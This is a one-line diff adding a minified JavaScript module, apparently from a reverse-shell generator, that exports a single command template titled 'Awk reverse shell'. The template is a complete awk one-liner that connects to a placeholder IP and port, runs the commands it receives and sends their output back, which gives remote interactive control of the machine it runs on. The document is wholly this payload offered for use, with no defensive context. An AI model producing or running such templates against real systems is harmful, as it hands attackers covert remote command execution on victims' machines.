@@ -1,0 +1,1 @@
+const e=[{title:"Awk reverse shell",template:`awk 'BEGIN {s = "/inet/tcp/0/{ip}/{port}"; while(42) { do{ printf "shell>" |& s; s |& getline c; if(c){ while ((c |& getline) > 0) print $0 |& s; close(c); } } while(c != "exit") close(s); }}' /dev/null`,description:"Awk reverse shell using inet/tcp for socket communication."}],t={commands:e};export{e as commands,t as default};
